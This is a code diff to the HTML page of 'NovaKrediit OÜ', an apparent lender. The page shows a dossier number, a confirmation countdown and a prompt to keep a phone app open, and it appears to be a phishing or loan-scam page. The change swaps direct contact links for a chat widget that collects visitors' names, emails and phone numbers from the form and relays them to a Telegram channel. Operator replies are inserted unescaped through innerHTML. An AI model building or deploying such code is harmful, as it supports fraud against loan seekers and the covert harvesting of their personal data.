@@ -259,6 +259,31 @@ body{
   .card{padding:24px 16px 20px;}
   .code-number{font-size:2.4rem;}
 }
+/* ── CHAT WIDGET ── */
+#nk-chat-widget{position:fixed;bottom:24px;right:24px;z-index:99999;font-family:'Inter',sans-serif;}
+#nk-chat-btn{background:#0a1628;color:#fff;border:none;border-radius:50px;padding:13px 20px 13px 16px;display:flex;align-items:center;gap:10px;cursor:pointer;box-shadow:0 4px 20px rgba(10,22,40,0.4);font-weight:600;font-size:0.88rem;border-bottom:3px solid #d4a843;transition:all 0.2s;}
+#nk-chat-btn:hover{transform:translateY(-2px);}
+#nk-chat-box{display:none;position:absolute;bottom:68px;right:0;width:310px;background:#fff;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,0.2);overflow:hidden;flex-direction:column;}
+#nk-chat-box.open{display:flex;}
+#nk-chat-head{background:#0a1628;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;}
+#nk-chat-head-info{display:flex;align-items:center;gap:10px;}
+#nk-chat-avatar{width:36px;height:36px;background:#d4a843;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:0.8rem;color:#0a1628;}
+#nk-chat-name{color:#fff;font-weight:700;font-size:0.86rem;}
+#nk-chat-status{color:rgba(255,255,255,0.5);font-size:0.7rem;display:flex;align-items:center;gap:4px;margin-top:2px;}
+#nk-chat-dot{width:6px;height:6px;background:#4ade80;border-radius:50%;display:inline-block;}
+#nk-chat-close{background:none;border:none;color:rgba(255,255,255,0.5);font-size:1rem;cursor:pointer;padding:2px;}
+#nk-chat-messages{padding:14px;display:flex;flex-direction:column;gap:8px;max-height:240px;overflow-y:auto;background:#f7f8fa;}
+.nk-msg{max-width:85%;padding:9px 12px;border-radius:12px;font-size:0.84rem;line-height:1.5;word-break:break-word;}
+.nk-msg-bot{background:#fff;border:1px solid #e5e7eb;border-radius:12px 12px 12px 3px;color:#1a1a2e;align-self:flex-start;}
+.nk-msg-user{background:#0a1628;color:#fff;border-radius:12px 12px 3px 12px;align-self:flex-end;}
+.nk-msg-time{font-size:0.65rem;opacity:0.5;margin-top:3px;}
+#nk-chat-form{display:flex;padding:10px;gap:8px;border-top:1px solid #e5e7eb;background:#fff;}
+#nk-chat-input{flex:1;border:1.5px solid #e5e7eb;border-radius:20px;padding:8px 14px;font-size:0.84rem;font-family:'Inter',sans-serif;outline:none;resize:none;}
+#nk-chat-input:focus{border-color:#d4a843;}
+#nk-chat-send{background:#0a1628;color:#fff;border:none;border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background 0.2s;}
+#nk-chat-send:hover{background:#1a3460;}
+@media(max-width:400px){#nk-chat-box{width:calc(100vw - 32px);right:0;}}
+
 </style>
 </head>
 <body>
@@ -299,37 +324,10 @@ body{
     <div class="dossier-num" id="dossier-display">NK-2026-0000</div>
   </div>
 
-  <!-- Contact dès le début -->
-  <div class="contact-bar">
-    <span class="contact-bar-text">Vajate abi?</span>
-    <button class="contact-bar-btn" onclick="toggleChannels()">Võtke ühendust</button>
-  </div>
-
-  <!-- Canaux (toggle) -->
-  <div class="channels" id="channels">
-    <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" class="ch-btn ch-tg">
-      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8l-1.69 7.96c-.12.56-.46.7-.93.43l-2.57-1.89-1.24 1.19c-.14.13-.25.25-.51.25l.18-2.59 4.71-4.25c.2-.18-.04-.28-.32-.1L7.9 14.47 5.37 13.7c-.55-.17-.56-.55.12-.82l9.28-3.58c.46-.17.86.11.87.5z" fill="white"/></svg>
-      Telegram
-    </a>
-    <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" class="ch-btn ch-sig">
-      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="white" opacity="0.3"/><path d="M12 7a5 5 0 100 10A5 5 0 0012 7z" fill="white"/></svg>
-      Signal
-    </a>
-    <a href="mailto:novakrediit@mail.ee" class="ch-btn ch-mail">
-      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><rect x="2" y="4" width="20" height="16" rx="2" stroke="white" stroke-width="1.8"/><path d="M2 7l10 7 10-7" stroke="white" stroke-width="1.8"/></svg>
-      novakrediit@mail.ee
-    </a>
-  </div>
-
   <!-- Message expiration (affiché après 2 min) -->
   <div class="expired-box" id="expired-box">
     <div class="expired-title">⏱ Kinnituse aeg on lõppenud</div>
-    <div class="expired-sub">Palun võtke meiega ühendust — aitame teid kohe!</div>
-    <div style="display:flex;flex-direction:column;gap:7px;">
-      <a href="https://t.me/+37254505527" target="_blank" rel="noopener noreferrer" class="ch-btn ch-tg">Telegram</a>
-      <a href="https://signal.me/#p/+37256186725" target="_blank" rel="noopener noreferrer" class="ch-btn ch-sig">Signal</a>
-      <a href="mailto:novakrediit@mail.ee" class="ch-btn ch-mail">novakrediit@mail.ee</a>
-    </div>
+    <div class="expired-sub">Vajate abi? Kasutage allpool olevat chati — aitame teid kohe!</div>
   </div>
 
   <p class="hint" id="hint-text">Kui kinnitust ei tule, kontrollige oma telefoni<br>ja veenduge et rakendus on avatud.</p>
@@ -377,5 +375,103 @@ function toggleChannels(){
   c.classList.toggle('open');
 }
 </script>
+<!-- CHAT WIDGET TELEGRAM -->
+<div id="nk-chat-widget">
+  <button id="nk-chat-btn" onclick="nkToggleChat()">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" stroke="white" stroke-width="2" stroke-linejoin="round"/></svg>
+    <span>Kirjuta meile</span>
+  </button>
+  <div id="nk-chat-box">
+    <div id="nk-chat-head">
+      <div id="nk-chat-head-info">
+        <div id="nk-chat-avatar">NK</div>
+        <div>
+          <div id="nk-chat-name">NovaKrediit OÜ</div>
+          <div id="nk-chat-status"><span id="nk-chat-dot"></span> Oleme siin</div>
+        </div>
+      </div>
+      <button id="nk-chat-close" onclick="nkToggleChat()">✕</button>
+    </div>
+    <div id="nk-chat-messages">
+      <div class="nk-msg nk-msg-bot">👋 Tere! Kuidas saame teid aidata?<div class="nk-msg-time">NovaKrediit</div></div>
+    </div>
+    <div id="nk-chat-form">
+      <input type="text" id="nk-chat-input" placeholder="Kirjutage sõnum..." onkeydown="if(event.key==='Enter')nkSend()">
+      <button id="nk-chat-send" onclick="nkSend()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M22 2L11 13" stroke="white" stroke-width="2" stroke-linecap="round"/><path d="M22 2L15 22l-4-9-9-4 20-7z" stroke="white" stroke-width="2" stroke-linejoin="round"/></svg>
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+var nkOpen=false;
+var nkSession=null;
+var nkPollInterval=null;
+var nkLastUpdate=0;
+var NK_API='/.netlify/functions/telegram';
+
+function nkToggleChat(){
+  nkOpen=!nkOpen;
+  var box=document.getElementById('nk-chat-box');
+  if(nkOpen){box.classList.add('open');document.getElementById('nk-chat-input').focus();if(!nkSession)nkStartSession();}
+  else{box.classList.remove('open');}
+}
+function nkStartSession(){
+  nkSession='nk_'+Date.now();
+  nkPollInterval=setInterval(nkPollMessages,3000);
+}
+function nkGetTime(){
+  var d=new Date();
+  return d.getHours()+':'+(d.getMinutes()<10?'0':'')+d.getMinutes();
+}
+function nkAddMessage(text,type){
+  var msgs=document.getElementById('nk-chat-messages');
+  var div=document.createElement('div');
+  div.className='nk-msg '+(type==='user'?'nk-msg-user':'nk-msg-bot');
+  div.innerHTML=text+'<div class="nk-msg-time">'+nkGetTime()+'</div>';
+  msgs.appendChild(div);
+  msgs.scrollTop=msgs.scrollHeight;
+}
+function nkSend(){
+  var input=document.getElementById('nk-chat-input');
+  var text=input.value.trim();
+  if(!text) return;
+  input.value='';
+  nkAddMessage(text,'user');
+  var name=document.getElementById('eesnimi')?document.getElementById('eesnimi').value:'';
+  var email=document.getElementById('epost')?document.getElementById('epost').value:'';
+  var tel=document.getElementById('telefon')?document.getElementById('telefon').value:'';
+  var msg='💬 *NovaKrediit Chat*\n';
+  if(name) msg+='👤 '+name+'\n';
+  if(email) msg+='📧 '+email+'\n';
+  if(tel) msg+='📱 '+tel+'\n';
+  msg+='\n'+text+'\n\n_Session: '+nkSession+'_';
+  fetch(NK_API,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({action:'send',text:msg})
+  }).catch(function(){});
+}
+function nkPollMessages(){
+  fetch(NK_API,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({action:'poll',offset:nkLastUpdate+1})
+  }).then(function(r){return r.json();})
+  .then(function(data){
+    if(!data.ok||!data.result||!data.result.length) return;
+    data.result.forEach(function(update){
+      nkLastUpdate=update.update_id;
+      if(update.message&&update.message.from&&!update.message.from.is_bot){
+        var txt=update.message.text;
+        if(txt) nkAddMessage(txt,'bot');
+      }
+    });
+  }).catch(function(){});
+}
+</script>
+
+
 </body>
 </html>
